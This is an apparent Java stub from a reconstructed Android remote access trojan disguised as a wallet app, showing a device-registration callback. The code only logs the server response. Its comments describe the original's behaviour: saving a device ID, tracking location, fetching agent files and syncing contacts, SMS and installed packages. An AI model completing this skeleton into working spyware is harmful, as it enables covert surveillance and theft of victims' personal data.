package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.w (RegisterCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * RegisterCallback - 设备注册回调
 * vendor: 解析 ApiResult<String>，保存 deviceId，触发:
 * - fetchLocateValues (l.a)
 * - queryAgentFile (l.u)
 * - fetchListenWindows (l.d)
 * - syncPackages / syncContacts / syncSms (条件触发)
 */
public final class w implements Callback {

    private static final String TAG = "RegisterCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<String>, saves deviceId,
            // triggers fetchLocateValues, queryAgentFile, fetchListenWindows,
            // conditionally syncs packages/contacts/sms
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
